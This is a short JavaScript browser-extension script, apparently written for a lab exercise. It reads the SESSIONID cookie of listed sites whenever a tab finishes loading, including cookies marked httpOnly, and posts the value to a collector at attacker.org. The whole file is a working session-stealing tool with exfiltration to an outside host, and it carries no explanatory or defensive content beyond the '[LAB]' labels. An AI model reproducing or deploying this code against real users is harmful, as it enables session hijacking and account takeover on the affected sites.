const LAB_HOSTS = ["ventifyfinance.org", "attacker.org"];
const COLLECTOR = "http://attacker.org:8080/collect";

async function grabSession(host) {
  const url = `http://${host}/`;
  const all = await browser.cookies.getAll({ url });
  const sid = all.find(c => c.name === "SESSIONID");
  if (!sid) return;

  const payload = {
    ts: Date.now(),
    host,
    sessionid: sid.value,
    httpOnly: sid.httpOnly,
    secure: sid.secure,
    sameSite: sid.sameSite
  };

  try {
    await fetch(COLLECTOR, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log("[LAB] sent", payload);
  } catch (e) {
    console.error("[LAB] collector unreachable", e);
  }
}

browser.tabs.onUpdated.addListener((id, info, tab) => {
  if (info.status !== "complete" || !tab.url) return;
  for (const h of LAB_HOSTS) {
    if (tab.url.startsWith(`http://${h}/`)) grabSession(h);
  }
});
